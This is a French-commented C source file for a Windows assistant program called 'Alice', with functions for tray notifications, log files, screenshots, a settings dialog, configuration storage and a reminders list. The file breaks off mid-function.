//=============================================================================
// Projet : Alice (Assistante)
// Fichier : fonctions.c
//
//=============================================================================

#include "resources.h"


//=============================================================================
//      Fonction qui affiche un ballon dans la TrayIcon (la notification)
//=============================================================================

void afficherTrayIconBallon(char *titre, char *contenu, unsigned int temp, BOOL icone)
{
   lstrcpy(TrayIcon.szInfoTitle, titre); /* Titre */
   lstrcpy(TrayIcon.szInfo, contenu); /* Contenu du ballon */
   TrayIcon.uTimeout = temp;  /* Temp d'attente */
   if (icone)
      TrayIcon.dwInfoFlags = NIIF_INFO;
   else
      TrayIcon.dwInfoFlags = NIIF_NONE;
   Shell_NotifyIcon(NIM_MODIFY, &TrayIcon); /* Modification */
}

//=============================================================================
//            Fonction qui enregistre les donn�es dans le fichier log
//=============================================================================

BOOL enregistrerDansLog(char *log, char *fichier, BOOL ecraserAncien)
{
   HANDLE hFichier;
   DWORD FileSize, nbcharRead;
   
   FileSize = lstrlen(log);
   if (ecraserAncien)
      hFichier = CreateFile(fichier, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
   else
      hFichier = CreateFile(fichier, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
   if(hFichier != INVALID_HANDLE_VALUE)
   {
      /* Mettre le pointeur du fichier � la fin */
      if (!ecraserAncien)
         SetFilePointer(hFichier, 0, NULL, FILE_END);
      /* Ecrire la lettre dans le fihier log */
      WriteFile(hFichier, log, FileSize, &nbcharRead, NULL);
      /* Fermer le fichier */
      CloseHandle(hFichier);
      return TRUE;
   }
   else
      return FALSE;
}

//=============================================================================
//             Fonction qui lit les donn�es du le fichier log
//=============================================================================

BOOL lireApartirDeLog(LPVOID *hwnd, char *fichier, BOOL posBottom, BOOL colorier)
{
   HANDLE hFichier;
   DWORD FileSize, nbcharRead;
   CHAR *buffer;

   hFichier = CreateFile(fichier, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
   if(hFichier != INVALID_HANDLE_VALUE) /* Si fichier trouv� */
   {
      FileSize = GetFileSize(hFichier, NULL);
      buffer = (PCHAR)LocalAlloc(LMEM_FIXED, FileSize+1);
      ReadFile(hFichier, buffer, FileSize, &nbcharRead, NULL) ; /* Lecture */
      buffer[FileSize] = 0;
      SendMessage(*hwnd, WM_SETTEXT, 0, (LPARAM)buffer); /* Affichage � l'�cran */
      if (colorier)
      {
         colorierTexte(hwnd, '#', 'e', buffer, lstrlen(buffer), RGB(0, 0, 160)); /* bleu */
         colorierTexte(hwnd, '=', '>', buffer, lstrlen(buffer), RGB(0, 150, 0)); /* vert */
         colorierTexte(hwnd, '<', '>', buffer, lstrlen(buffer), RGB(255, 0, 0)); /* rouge */
         colorierCaractere(hwnd, '#', buffer, lstrlen(buffer), RGB(128, 0, 0)); /* grena */
         colorierCaractere(hwnd, ':', buffer, lstrlen(buffer), RGB(225, 55, 56)); /* rose */
         colorierCaractere(hwnd, '/', buffer, lstrlen(buffer), RGB(225, 55, 56)); /* rose */
         colorierCaractere(hwnd, '[', buffer, lstrlen(buffer), RGB(255, 0, 0)); /* rouge */
         colorierCaractere(hwnd, ']', buffer, lstrlen(buffer), RGB(255, 0, 0)); /* rouge */
         colorierCaractere(hwnd, '$', buffer, lstrlen(buffer), RGB(0, 150, 0)); /* vert */
      }
      if (posBottom)
         SendMessage(*hwnd, WM_VSCROLL, SB_BOTTOM, 0); /* On descend � la derni�re ligne */
      LocalFree(buffer);
      CloseHandle(hFichier);
      return TRUE;
   }
   else
      return FALSE;
}

//=============================================================================
//        Fonction qui enregistre et lit les donn�es du le fichier log
//=============================================================================

BOOL enregistrerEtLireLog(char *log, LPVOID *ptLParam, char *fichier, BOOL posBottom, BOOL ecraserAncien, BOOL colorier)
{
   BOOL STAT = FALSE;
   //SetFileAttributes(PATH_TO_LOG, FILE_ATTRIBUTE_NORMAL); /* D�verouillage du dossier qui contient les logs */
   
   if (enregistrerDansLog(log, fichier, ecraserAncien))
   {
      if (lireApartirDeLog(ptLParam, fichier, posBottom, colorier))
         STAT = TRUE;
   }
   
   //SetFileAttributes(PATH_TO_LOG, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM); /* V�rouillage du dossier */
   
   if (STAT)
      return TRUE;
   else
      return FALSE;
}

//=============================================================================
//     Fonction qui passe les parametres au programme d'impression d'�cran
//=============================================================================

BOOL callProgram(char *programme, char *parametres)
{
   STARTUPINFO si;
   PROCESS_INFORMATION pi;
   ZeroMemory(&si, sizeof(si));
   si.cb = sizeof(si);
   ZeroMemory(&pi, sizeof(pi));
   
   //SetFileAttributes(PATH_TO_LOG, FILE_ATTRIBUTE_NORMAL); /* D�verouillage du dossier qui contient les logs */
   /* On appelle le programme et on lui passe les parametres */
   CreateProcess(programme, parametres, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
   
   CloseHandle(pi.hProcess);
   CloseHandle(pi.hThread);
   //SetFileAttributes(PATH_TO_LOG, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM); /* V�rouillage du dossier */
   
   return TRUE;
}

//=============================================================================
//      Fonction qui permet de faire un screenshot (une capture d'�cran)
//=============================================================================

BOOL screenShot(HWND hwnd)
{
   OPENFILENAME ofn;
   CHAR szFile[260] = {0};

   ZeroMemory(&ofn, sizeof(OPENFILENAME));
   
   #ifdef OPENFILENAME_SIZE_VERSION_400
      ofn.lStructSize = OPENFILENAME_SIZE_VERSION_400;
   #else
      ofn.lStructSize = sizeof(OPENFILENAME);
   #endif
   
   ofn.hwndOwner = hwnd;
   ofn.lpstrFile = szFile;
   ofn.nMaxFile = sizeof(szFile);
   ofn.lpstrFilter = "Fichier Image (*.jpg)\0*.jpg\0";
   ofn.nFilterIndex = 1;
   ofn.lpstrDefExt = "jpg"; /* Extension par d�faut (s'il y'en a aucune) */
   ofn.Flags = OFN_PATHMUSTEXIST | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;
   
   if (GetSaveFileName(&ofn) == TRUE) /* Si emplacement de sauvegarde choisi */
   {
      char tmp[300];
      sprintf(tmp, "impscreen %s %d", szFile, MAX_IMPR_QUALITY);
      callProgram(SCREENSHOT_EXE, tmp); /* Capture d'�cran */
      return TRUE;
   }
   else
      return FALSE;
}

//=============================================================================
//         Fonction qui r�cup�re l'emplacement actuel du programme
//=============================================================================

void getMyDirectory(char *path)
{ 
   /* R�cup�ration de l'emplacement actuel du programme */
   char *c = path+GetModuleFileName(0, path, MAX_PATH); 
   
   /* Suppression du nom de l'ex� */
   while (*c != '\\') 
      c--;
   
   *c = 0;
}

//=============================================================================
//             Fonction qui affiche les �l�ments des tabs
//=============================================================================

BOOL afficherTab(HWND hwnd, unsigned short tab)
{
   if (tab == 1)
   {
      /* On affiche les �l�ments du 1er onglet */
      ShowWindow(GetDlgItem(hwnd, IDC_ACTIVE_QUITTER), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, IDC_ACTIVE_PASSWORD), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, IDC_ACTIVE_ACCUEIL), SW_SHOW);
   }
   else if (tab == 2)
   {
      /* On affiche les �l�ments du 2�me onglet */
      ShowWindow(GetDlgItem(hwnd, TXT_1), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, TXT_2), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, TXT_3), SW_SHOW);
      /* Jour */
      ShowWindow(GetDlgItem(hwnd, IDE_JOURH), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, BT_PLUS_JOURH), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, BT_MOIN_JOURH), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, TXT_JOURH), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, IDE_JOURM), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, BT_PLUS_JOURM), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, BT_MOIN_JOURM), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, TXT_JOURM), SW_SHOW);
      /* Nuit */
      ShowWindow(GetDlgItem(hwnd, IDE_NUITH), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, BT_PLUS_NUITH), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, BT_MOIN_NUITH), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, TXT_NUITH), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, IDE_NUITM), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, BT_PLUS_NUITM), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, BT_MOIN_NUITM), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, TXT_NUITM), SW_SHOW);
      /* Sommeil */
      ShowWindow(GetDlgItem(hwnd, IDE_SOMMEILH), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, BT_PLUS_SOMMEILH), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, BT_MOIN_SOMMEILH), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, TXT_SOMMEILH), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, IDE_SOMMEILM), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, BT_PLUS_SOMMEILM), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, BT_MOIN_SOMMEILM), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, TXT_SOMMEILM), SW_SHOW);
   }
   else if (tab == 3)
   {
      /* On affiche les �l�ments du 3�me onglet */
      ShowWindow(GetDlgItem(hwnd, IDC_ACTIVE_BILANDLG), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, TXT_MDP), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, IDE_MDP), SW_SHOW);
      ShowWindow(GetDlgItem(hwnd, IDC_AFFICHER_MDP), SW_SHOW);
   }
   else if (tab == 4)
   {
      /* On affiche les �l�ments du 4�me onglet */
      ShowWindow(GetDlgItem(hwnd, IDE_WHITE_LISTE), SW_SHOW);
   }
   else if (tab == 5)
   {
      /* On affiche les �l�ments du 5�me onglet */
      ShowWindow(GetDlgItem(hwnd, IDE_FENETRES_CIBLES), SW_SHOW);
   }
   else
      return FALSE;
      
   return TRUE;
}

//=============================================================================
//               Fonction qui cache les �l�ments des tabs
//=============================================================================

BOOL cacherTab(HWND hwnd, unsigned short tab)
{
   if (tab == 1)
   {
      /* On cache les �l�ments du 1er onglet */
      ShowWindow(GetDlgItem(hwnd, IDC_ACTIVE_QUITTER), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, IDC_ACTIVE_PASSWORD), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, IDC_ACTIVE_ACCUEIL), SW_HIDE);
   }
   else if (tab == 2)
   {
      /* On cache les �l�ments du 2�me onglet */
      ShowWindow(GetDlgItem(hwnd, TXT_1), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, TXT_2), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, TXT_3), SW_HIDE);
      /* Jour */
      ShowWindow(GetDlgItem(hwnd, IDE_JOURH), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, BT_PLUS_JOURH), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, BT_MOIN_JOURH), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, TXT_JOURH), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, IDE_JOURM), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, BT_PLUS_JOURM), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, BT_MOIN_JOURM), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, TXT_JOURM), SW_HIDE);
      /* Nuit */
      ShowWindow(GetDlgItem(hwnd, IDE_NUITH), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, BT_PLUS_NUITH), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, BT_MOIN_NUITH), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, TXT_NUITH), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, IDE_NUITM), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, BT_PLUS_NUITM), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, BT_MOIN_NUITM), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, TXT_NUITM), SW_HIDE);
      /* Sommeil */
      ShowWindow(GetDlgItem(hwnd, IDE_SOMMEILH), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, BT_PLUS_SOMMEILH), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, BT_MOIN_SOMMEILH), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, TXT_SOMMEILH), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, IDE_SOMMEILM), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, BT_PLUS_SOMMEILM), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, BT_MOIN_SOMMEILM), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, TXT_SOMMEILM), SW_HIDE);
   }
   else if (tab == 3)
   {
      /* On cache les �l�ments du 3�me onglet */
      ShowWindow(GetDlgItem(hwnd, IDC_ACTIVE_BILANDLG), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, TXT_MDP), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, IDE_MDP), SW_HIDE);
      ShowWindow(GetDlgItem(hwnd, IDC_AFFICHER_MDP), SW_HIDE);
   }
   else if (tab == 4)
   {
      /* On cache les �l�ments du 4�me onglet */
      ShowWindow(GetDlgItem(hwnd, IDE_WHITE_LISTE), SW_HIDE);
   }
   else if (tab == 5)
   {
      /* On cache les �l�ments du 5�me onglet */
      ShowWindow(GetDlgItem(hwnd, IDE_FENETRES_CIBLES), SW_HIDE);
   }
   else
      return FALSE;
      
   return TRUE;
}

//=============================================================================
//    Fonction qui charge les parametres depuis le fichier de configuration
//=============================================================================

BOOL chargerConfig()
{
   FILE *Fichier = fopen(FICHIER_CONFIG, "r");
   
   if (Fichier != NULL)
   {
      short cpt = 0;
      /* On se place au d�but du fichier */
      fseek(Fichier, 0, SEEK_SET);
      
      while (cpt < 8)
      {
         switch(cpt)
         {
            case 0 : fscanf(Fichier, "%d", &ACTIVE_QUITTER); break;
            case 1 : fscanf(Fichier, "%d", &ACTIVE_PASSWORD); break;
            case 2 : fscanf(Fichier, "%d", &ACTIVE_MSG_ACCUEIL); break;
            case 3 : fscanf(Fichier, "%d%d", &jourHeure, &jourMinute); break;
            case 4 : fscanf(Fichier, "%d%d", &nuitHeure, &nuitMinute); break;
            case 5 : fscanf(Fichier, "%d%d", &sommeilHeure, &sommeilMinute); break;
            case 6 : fscanf(Fichier, "%d", &ACTIVE_BILAN_DLG); break;
            case 7 : fscanf(Fichier, "%s", PASSWORD); break;
         }
         fseek(Fichier, 1, SEEK_CUR); /* On saute la ligne */
         cpt++;     
      }
      fclose(Fichier);
      
      decrypterVigenere(PASSWORD, CLE_CRYPTAGE); /* On d�crypte le mot de passe */
      
      return TRUE;
   }
   else /* Si nn, on charge les parametres par d�faut */
   {
      ACTIVE_QUITTER = TRUE;
      ACTIVE_PASSWORD = FALSE;
      ACTIVE_MSG_ACCUEIL = TRUE;
      jourHeure = 6;
      jourMinute = 0;
      nuitHeure = 18;
      nuitMinute = 0;
      sommeilHeure = 0;
      sommeilMinute = 0;
      ACTIVE_BILAN_DLG = TRUE;
      lstrcpy(PASSWORD, DEFAULT_PASSWORD);
      
      sauvegarderConfig(); /* On sauvegarde les parametres par d�faut */
      
      return FALSE;
   }
}

//=============================================================================
//   Fonction qui sauvegarde les parametres dans le fichier de configuration
//=============================================================================

BOOL sauvegarderConfig()
{
   FILE *Fichier = fopen(FICHIER_CONFIG, "w+");
   
   if (Fichier != NULL)
   {
      char PASSWORD_CRYPTER[MAX_PASSWORD];
      lstrcpy(PASSWORD_CRYPTER, PASSWORD);
      crypterVigenere(PASSWORD_CRYPTER, CLE_CRYPTAGE); /* On crypte le mot de passe (pour la sauvegarde) */
      /* On sauvegarde les parametres */
      fprintf(Fichier, "%d\n%d\n%d\n%d %d\n%d %d\n%d %d\n%d\n%s", ACTIVE_QUITTER, ACTIVE_PASSWORD
      , ACTIVE_MSG_ACCUEIL, jourHeure, jourMinute, nuitHeure, nuitMinute, sommeilHeure, sommeilMinute
      , ACTIVE_BILAN_DLG, PASSWORD_CRYPTER);
      /* On ferme le fichier */
      fclose(Fichier);
      
      return TRUE;
   }
   else
      return FALSE;
}

//=============================================================================
//       Fonction qui colorie le texte sp�cifi� par cDebut et cFin
//=============================================================================

int colorierTexte(LPVOID *hwnd, char cDebut, char cFin, char *texte, int texteSize, COLORREF couleur)
{
   int i, cDebutTrouver = 0;
   unsigned int trouver = 0;
   CHARRANGE Selection;
    
   for (i = 0; i < texteSize; i++)
   {
      if (texte[i] == cDebut) /* Si caract�re de d�but trouv� */
      {
         Selection.cpMin = i;
         cDebutTrouver = 1;
      }
      else if (cDebutTrouver && texte[i] == cFin)
      {
         Selection.cpMax = i+1;
         trouver++;
         changerCouleurSelection((LPVOID)hwnd, Selection, couleur);
         cDebutTrouver = 0;
      }
   } // FIN FOR

   return trouver;  
}

//=============================================================================
//              Fonction qui colorie le caract�re sp�cifi�
//=============================================================================

int colorierCaractere(LPVOID *hwnd, char c, char *texte, int texteSize, COLORREF couleur)
{
   int i;
   unsigned int trouver = 0;
   CHARRANGE Selection;
   
   for (i = 0; i < texteSize; i++)
   {
      if (texte[i] == c) /* Si caract�re trouv� */
      {
         Selection.cpMin = i;
         Selection.cpMax = i+1;
         trouver++;
         changerCouleurSelection((LPVOID)hwnd, Selection, couleur);
      }
   } // FIN FOR

   return trouver;  
}

//=============================================================================
//              Fonction qui explore et compte les dossiers
//
// @ Cette fontion peux retourner le nombre de dossier et le nom du dernier
//   si compterDossier == TRUE, si nn elle retournera le nom du dossier
//   qui a le num�ro pass� dans nbrDossier
//=============================================================================

BOOL explorerDossier(char *path, char *buffer, unsigned int *nbrDossier, BOOL compterDossier)
{
   WIN32_FIND_DATA File;
   HANDLE hSearch;
   unsigned int cpt = 0;
   BOOL QUITTER = FALSE;
   
   char *search;
   search = malloc(lstrlen(path)+5); /* +4 ("\\*.*") + 1 */
   sprintf(search, "%s\\*.*", path);
   
   hSearch = FindFirstFile(search, &File);
   if (hSearch != INVALID_HANDLE_VALUE) /* Si dossier/path trouv� */
   {
      do 
      {
         if (!strstr(File.cFileName, ".")) /* Si c'est un dossier (ne contient pas de '.') */
         {
            if (compterDossier)
            {
               (*nbrDossier)++;
               sprintf(buffer, "%s", File.cFileName); /* !@! � revoir, c'est du gaspillage du CPU */
            }
            else
            {
               cpt++;
               if (cpt == *nbrDossier)
               {
                  sprintf(buffer, "%s", File.cFileName);
                  QUITTER = TRUE;
               }
            }
         }
      }while (!QUITTER && FindNextFile(hSearch, &File));
      
      FindClose(hSearch);
      free(search);
      
      return TRUE;
   }
   else
   {
      free(search);
      return FALSE;
   }
}

//=============================================================================
// Fonction qui recherche le texte d'un edit (2�me) dans l'edit sp�cifi� (1er)
//=============================================================================

int rechercherTexteEdit(HANDLE *hEdit, HANDLE *hEditTexte)
{
   /* R�cup�ration des longueurs des textes */
   unsigned int texteSize = GetWindowTextLength(*hEdit);
   unsigned int aRechercherSize = GetWindowTextLength(*hEditTexte);
   char texteDeRecherche[texteSize+1], texteArechercher[aRechercherSize+1];
   /* R�cup�rations des textes */
   GetWindowText(*hEdit, texteDeRecherche, texteSize+1);
   GetWindowText(*hEditTexte, texteArechercher, aRechercherSize+1);
   /* Recherche de : texteArechercher dans texteDeRecherche */
   int i, j, save, nbrDeLigne = 0, trouver = 0;
   CHARRANGE Selection;
   
   for (i = 0; i < texteSize; i++)
   {
      if (texteDeRecherche[i] == texteArechercher[0]) /* Si premier caract�re de texteArechercher trouv� */
      {
         if (aRechercherSize == 1) /* Si le texte recherch� a d�j� �t� trouv� (vu qu'il ne contient qu'un seul caract�re) */
         {
            if (trouver < 1) /* Si pas encore trouv� avant */
            {
               Selection.cpMin = 0;
               Selection.cpMax = texteSize;
               /* On change la couleur de tout l'edit au noir */
               changerCouleurSelection(hEdit, Selection, RGB(0, 0, 0));           
               /* On positionne la barre de d�filement en haut */
               SendMessage(*hEdit, WM_VSCROLL, SB_TOP, 0);
               int k;
               for (k = 0; k < nbrDeLigne; k++)
                  SendMessage(*hEdit, WM_VSCROLL, SB_LINEDOWN, 0); /* On descend ligne par ligne en bas (jusqu'au premier mot trouv�) */
            }
            /* Indice de d�but (cpMin) et un indice de fin (cpMax) de la s�lection */
            Selection.cpMin = i-nbrDeLigne; /* Car dans un edit "\r\n" == '\n' donc il faut retirer 1 (-1) pour chaque caract�re '\r' */
            Selection.cpMax = i+1-nbrDeLigne;
            /* On change la couleur du texte trouv� au rouge */
            changerCouleurSelection(hEdit, Selection, RGB(255, 0, 0));
            trouver++;
         }
         save = i;
         for (j = 1; j < aRechercherSize && i < texteSize-1; j++) /* On cherche les autres caract�res */
         {
            i++;
            if (texteArechercher[j] != texteDeRecherche[i]) /* Si caract�re diff�rent (ce n'est pas le texte recherch�) */
            {
               i = save;
               break;                        
            }
            else if (j == aRechercherSize-1)
            {
               if (trouver < 1) /* Si pas encore trouv� avant */
               {
                  Selection.cpMin = 0;
                  Selection.cpMax = texteSize;
                  /* On change la couleur de tout l'edit au noir */
                  changerCouleurSelection(hEdit, Selection, RGB(0, 0, 0));
                  /* On positionne la barre de d�filement en haut */
                  SendMessage(*hEdit, WM_VSCROLL, SB_TOP, 0);
                  int k;
                  for (k = 0; k < nbrDeLigne; k++)
                     SendMessage(*hEdit, WM_VSCROLL, SB_LINEDOWN, 0); /* On descend ligne par ligne en bas (jusqu'au premier mot trouv�) */
               }
               /* Indice de d�but (cpMin) et un indice de fin (cpMax) de la s�lection */
               Selection.cpMin = save-nbrDeLigne;
               Selection.cpMax = save+j+1-nbrDeLigne;
               /* On change la couleur du texte trouv� au rouge */
               changerCouleurSelection(hEdit, Selection, RGB(255, 0, 0));
               trouver++;
            }
         } // FIN 2EME FOR
      } // FIN IF
      else if (texteDeRecherche[i] == '\n') /* Si nn si caract�re de retour � la ligne trouv� */
         nbrDeLigne++;
   } // FIN 1ER FOR
   
   /* PS: la couleur par d�faut de l'edit est le rouge maintemant (si on veux �crire �a s'�crira avec du rouge) */
   
   return trouver;
}

//=============================================================================
//     Fonction qui change la couleur de la selection dans l'edit sp�cifi�
//=============================================================================

void changerCouleurSelection(HANDLE *hEdit, CHARRANGE Selection, COLORREF couleur)
{
   /* Format du texte */
   CHARFORMAT2 Format;
   ZeroMemory(&Format, sizeof(CHARFORMAT2));
   Format.cbSize = sizeof(CHARFORMAT2);
   Format.dwMask = CFM_COLOR;
   /* La couleur a utilis� */
   Format.crTextColor = couleur;
   /* On indique au Rich Edit que l'on va utiliser la s�lection : Selection */
   SendMessage(*hEdit, EM_EXSETSEL, 0, (LPARAM)&Selection);
   /* On indique au Rich Edit que l'on va utiliser le format : Format */
   SendMessage(*hEdit, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&Format);  
}

//=============================================================================
//              Fonction qui cr�e les colones de la ListView
//=============================================================================

void creerListViewColone(HANDLE *handle, UINT largeurColone, char *nomColone, UINT idColone)
{
   LVCOLUMN lvc;
   lvc.mask = LVCF_TEXT | LVCF_WIDTH;
   lvc.cx = largeurColone;
   lvc.pszText = nomColone;
   ListView_InsertColumn(*handle, idColone, &lvc);         
}

//=============================================================================
//            Fonction qui ajoute le texte sp�cifi� � la liste view
//
// @ A refaire cet algo. car c'est path�tique, ou � laisser :D
//=============================================================================

void ajouterALaListView(HANDLE *hListView, char *texte, int tailleTexte, BOOL modifier, int posModification)
{ 
   int i = 0, j = 0, itemPos;
   char date[10], heure[5], rappel[MAX_SRAPPEL];
   
   if (!modifier)
   {
      LVITEM lvi;
      lvi.mask = LVIF_TEXT | LVIF_PARAM;
      lvi.iSubItem = 0;
      lvi.lParam = LVM_SORTITEMS;
      lvi.pszText = "";
      lvi.iItem = 0; /* Emplacement d'insersion (0 == tout en haut de la liste) */
      itemPos = ListView_InsertItem(*hListView, &lvi); /* Position actuelle dans la ListView */
   }
   else
      itemPos = posModification;
   
   while (texte[i] != ' ') /* Si le caract�re actuel n'est pas un espace */
   {
      date[j] = texte[i]; /* On r�cup�re la date */
      i++;
      j++;
   }
   date[j] = '\0'; /* Fin de la date */
   i++;
   j = 0;
   while (texte[i] != ' ') /* Si le caract�re actuel n'est pas un espace */
   {
      heure[j] = texte[i]; /* On r�cup�re l'heure */
      i++;
      j++;
   }
   heure[j] = '\0'; /* Fin de l'heure */
   j = 0;
   for (i++; i < tailleTexte; i++)
   {
      rappel[j] = texte[i]; /* On r�cup�re le sujet du rappel */
      j++;
   }
   rappel[j] = '\0'; /* Fin du sujet du rappel */
   /* On remplie la listView */
   ListView_SetItemText(*hListView, itemPos, 0, date); /* Partie1 (Date) */
   ListView_SetItemText(*hListView, itemPos, 1, heure); /* Partie2 (Heure) */
   ListView_SetItemText(*hListView, itemPos, 2, rappel); /* Partie3 (Rappel) */
}

//=============================================================================
//   Fonction qui v�rifie si l'heure et la date du rappel existe d�j� ou pas
//
// @ J'ai utilis� hListView directement sans la pass� en param�tres car c'est
//   une variable globale
// @ Cette fonction retourne TRUE si rappel diff�rent et FALSE si nn
//=============================================================================

BOOL verifierRappel(char *cheminFichier, char *rappel, BOOL activerRappel)
{
   FILE *fichier = fopen(cheminFichier, "r");
   
   if (fichier != NULL)
   {
      BOOL FICHIER_VIDE = TRUE, RESSEMBLANCE;
      char *buffer;
      int i, j, s, cpt = ListView_GetItemCount(hListView)-1;
      int tailleMax = MAX_SRAPPEL+19; /* + (17) "xx-xx-xxxx xx:xx " + (1) '\n' + (1) */
      buffer = malloc(tailleMax);
      while (fgets(buffer, tailleMax, fichier) != NULL) /* On lit ligne par ligne le fichier tant qu'on re�oit pas d'erreur */
      {
         if (FICHIER_VIDE)
            FICHIER_VIDE = FALSE; /* On indique que le fichier n'est pas vide */
         
         RESSEMBLANCE = TRUE; /* On suppose qu'il y'a une ressemblance */
         
          i = 0; /* Pour v�rifier la date et l'heure */ 
          j = 0;
          s = 16;
          
         if (activerRappel)
         {
            if (buffer[0] == 'T')
            {
               i = 11; /* On v�rifie juste l'heure */
               j = 9; /* 9 car 'Toujours' contient 8 caract�res et une date contient 10, pour les calibrer 10-2 = 8 */
               //s = 16; /* D�j� initialis� */
            }
         }
         else
         {
            if (buffer[0] == 'T' && rappel[0] == 'T')
            {
               i = 9;
               j = 9;
               s = 14;
            }
            else if (ACTIVE_MODIFIER_RAPPEL) /* Si on est entrain de modifier un rappel */
            {
               if (cpt != lvItemActuel && rappel[0] == 'T')
               {
                  i = 9;
                  j = 11;
                  s = 14;
               }
               else if (cpt != lvItemActuel && buffer[0] == 'T')
               {
                  i = 11;
                  j = 9;
                  //s = 16;
               }                          
            }
            else
            {
               if (rappel[0] == 'T')
               {
                  i = 9;
                  j = 11;
                  s = 14;
               }
               else if (buffer[0] == 'T')
               {
                  i = 11;
                  j = 9;
                  //s = 16;
               }
            }
         }
         for (i; i < s; i++) /* On parcours la date et l'heure des rappels */
         {
            if (buffer[j] != rappel[i]) /* S'il y'a une diff�rence notre supposition est fause */
            {
               RESSEMBLANCE = FALSE;
               break;
            }  
            j++;
         }
         
         if (RESSEMBLANCE) /* S'il n'y a aucune diff�rence , alors notre supposition est correcte */
         {
            if (activerRappel)
            {
               char sujetDuRappel[MAX_SRAPPEL], heureDuRappel[5], log[100];
               /* On r�cup�re l'heure du rappel */
               if (buffer[0] == 'T') /* Si 'Toujours' trouv�e */
                  j = 9;
               else
                  j = 11;
               for (i = 0; i < 5; i++)
               {
                  heureDuRappel[i] = buffer[j];
                  j++;
               }
               heureDuRappel[i] = '\0';
               /* On r�cup�re le sujet du rappel */
               i = 0;
               for (j++; j < lstrlen(buffer)-1; j++) /* -1 car buffer contient un '\n' � la fin */
               {
                  sujetDuRappel[i] = buffer[j];
                  i++;   
               }
               sujetDuRappel[i] = '\0';
               /* On affiche/active le rappel (pendant 4 secondes) */
               afficherTrayIconBallon(NOM_SOLO " (Vous vous rappelez ?)", sujetDuRappel, 4000, TRUE);
               /* On sauvegarde le rappel dans le fichier log */
               sprintf(log, "=> %s : <Rappel> %s\n", heureDuRappel, sujetDuRappel);
               enregistrerDansLog(log, FICHIER_LOG, FALSE);
               /* On efface le rappel du fichier des rappels */
               fclose(fichier);
               if (buffer[0] != 'T') /* Si le rappel ne doit pas �tre r�p�t�, on l'efface */
               {
                  supprimerRappel(&hListView, FICHIER_RAPPEL, 0, TRUE, buffer);
                  /* On efface le rappel de la ListView */
                  if (IS_DLG_RAPPEL) /* Si dialogBox Rappel active */
                  {
                     char date[11], heure[6], datePlusHeure[16];
                     int item, nbrItem = ListView_GetItemCount(hListView); /* On r�cup�re le nombre d'item dans la listView */
                   
                     buffer[16] = '\0'; /* On tranche le buffer (car on a besoin que de la date et l'heure pour les comparer) */
                     for (item = 0; item < nbrItem; item++) /* On cherche le rappel dans la listView */
                     {
                        ListView_GetItemText(hListView, item, 0, date, 11); /* Partie1 (Date) */
                        ListView_GetItemText(hListView, item, 1, heure, 6); /* Partie2 (Heure) */
                        sprintf(datePlusHeure, "%s %s", date, heure);
                        if (!lstrcmp(buffer, datePlusHeure)) /* Une fois trouv� */
                        {
                           ListView_DeleteItem(hListView, item); /* On supprime le rappel de la listView */
                           free(buffer);
                           return FALSE; /* => Le rappel a �t� trouv� (existe) */
                        }
                     }
                  }
               }
            }
